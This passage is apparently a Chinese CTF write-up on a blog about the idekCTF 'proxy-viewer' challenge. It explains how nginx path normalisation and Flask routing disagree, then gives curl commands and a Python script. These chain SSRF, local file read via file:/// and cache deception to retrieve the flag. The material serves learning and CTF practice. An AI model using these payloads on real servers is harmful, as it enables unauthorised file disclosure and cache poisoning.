+<p>规范化处理，可以查看<a target="_blank" rel="noopener" href="https://www.rfc-editor.org/rfc/rfc3986#section-5.2.4">RFC 3986 5.2.4</a></p>
+<blockquote>
+<p>在处理的时候会进行以下循环</p>
+<p>A.如果输入缓冲区以“..&#x2F;”或“.&#x2F;”的前缀开头，则从输入缓冲区中删除该前缀；</p>
+<p>B.如果输入缓冲区以“&#x2F;.&#x2F;”或“&#x2F;.”的前缀开头，其中“.”是一个完整的路径段，然后在输入缓冲区中用“&#x2F;”替换该前缀；否则，</p>
+<p>C. 如果输入缓冲区以“&#x2F;..&#x2F;”或“&#x2F;..”的前缀开头，其中“..”是一个完整的路径段，则在输入缓冲区中用“&#x2F;”替换该前缀并从输出缓冲区删除最后一段及其前面的“&#x2F;”（如果有的话）；</p>
+<p>D. 如果输入缓冲区仅包含“.”或“..”，然后从输入缓冲区中删除它</p>
+<p>E. 将输入缓冲区中的第一个路径段移动到输出缓冲区的末尾，包括初始“&#x2F;”字符（如果有）和任何后续字符，直到但不包括下一个“&#x2F;”字或输入缓冲区的结尾。</p>
+</blockquote>
+<h2 id="0x02-题解-1"><a href="#0x02-题解-1" class="headerlink" title="0x02 题解"></a>0x02 题解</h2><p>所以只要利用这两个之间的差异性，就可以进行ssrf</p>
+<p>payload:</p>
+<p>注意后面是<code>/../../../</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a</span><br></pre></td></tr></table></figure>
+
+<p>将<code>:</code>进行url编码，防止浏览器识别为协议</p>
+<p>将<code>#</code>进行二次url编码，这样在第一次浏览器解码后，urlopen里面就会解码为<code>#</code>，从而不会处理后面的<code>/../../static/a</code></p>
+<blockquote>
+<p>根据上面的规范化处理(如果输入缓冲区以“&#x2F;..&#x2F;”或“&#x2F;..”的前缀开头，其中“..”是一个完整的路径段，则在输入缓冲区中用“&#x2F;”替换该前缀并从输出缓冲区删除最后一段及其前面的“&#x2F;”（如果有的话）；)，因为后面有三个<code>/../</code>，所以会把前面的<code>/proxy/file%3a///flag.txt%2523</code>都删掉，从而只留下了<code>/static/a</code></p>
+</blockquote>
+<p>所以nginx将<code>http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a</code>经过规范化处理后会得到<code>http://127.0.0.1/static/a</code></p>
+<p>这样就会读取flag.txt的内容，并被nginx保存在缓存中</p>
+<p>而且再一次访问这个url的时候，就会读取读取这个缓存，然后得到flag</p>
+<p>使用hackbar或者burpsuit可能会造成一些问题，导致不能成功，所以使用curl或者python进行打payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl --path-as-is http://localhost:1337/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/asdf</span><br><span class="line">$ curl --path-as-is http://localhost:1337/proxy/file:///flag.txt%23/../../../static/asdf | grep <span class="string">&quot;idek&#123;.*&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-downgrade大哥的wp和exp"><a href="#0x03-downgrade大哥的wp和exp" class="headerlink" title="0x03 downgrade大哥的wp和exp"></a>0x03 downgrade大哥的wp和exp</h2><p>idek里的老大哥:<a target="_blank" rel="noopener" href="https://downgraded.github.io/">https://downgraded.github.io/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">tl;dr: SSRF -&gt; local file read -&gt; cache deception</span><br><span class="line"></span><br><span class="line">nginx will cache anything if the path starts with /static</span><br><span class="line"></span><br><span class="line">if we take http://proxy-viewer/proxy/test/../../static/a:</span><br><span class="line"></span><br><span class="line">flask will see test/../../static/a as the path parameter, but nginx does not know this context and will normalize the ../s such that it thinks the path starts with /static</span><br><span class="line"></span><br><span class="line">urlopen will stop reading a filename at #, so something like /etc/passwd#asdf will read /etc/passwd</span><br><span class="line"></span><br><span class="line">so to put it together we first send this link:</span><br><span class="line"></span><br><span class="line">https://proxy-viewer-5366bdc77ddd5710.instancer.idek.team/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a</span><br><span class="line"></span><br><span class="line">this will submit a request to read the flag from localhost, and store it in the cache</span><br><span class="line"></span><br><span class="line">then, access the same SSRF&#x27;d url and read the cached response: https://proxy-viewer-5366bdc77ddd5710.instancer.idek.team/proxy/file:///flag.txt%23/../../../static/a</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string, random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># generate random string for unique caching</span></span><br><span class="line">cachebuster = <span class="string">&quot;&quot;</span>.join([random.choice(string.ascii_letters) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># nginx url</span></span><br><span class="line">base_url = <span class="string">&quot;http://localhost:1337&quot;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"><span class="comment">#s.proxies.update(proxies)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># store file in nginx cache</span></span><br><span class="line">url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/<span class="subst">&#123;cachebuster&#125;</span>&quot;</span></span><br><span class="line">req = requests.Request(method=<span class="string">&#x27;GET&#x27;</span>, url=url)</span><br><span class="line">prep = req.prepare()</span><br><span class="line">prep.url = url</span><br><span class="line">s.send(prep, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># view cached file</span></span><br><span class="line">url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/proxy/file:///flag.txt%23/../../../static/<span class="subst">&#123;cachebuster&#125;</span>&quot;</span></span><br><span class="line">req = requests.Request(method=<span class="string">&#x27;GET&#x27;</span>, url=url)</span><br><span class="line">prep = req.prepare()</span><br><span class="line">prep.url = url</span><br><span class="line">r = s.send(prep, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">flag = re.findall(<span class="string">&quot;idek&#123;.*&#125;&quot;</span>, r.text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/php/'>
+                            php
+                        </a>
+                    
+                        <a href='/tags/go/'>
+                            go
+                        </a>
+                    
+                        <a href='/tags/flask/'>
+                            flask
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/WP/'>
+                            WP
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
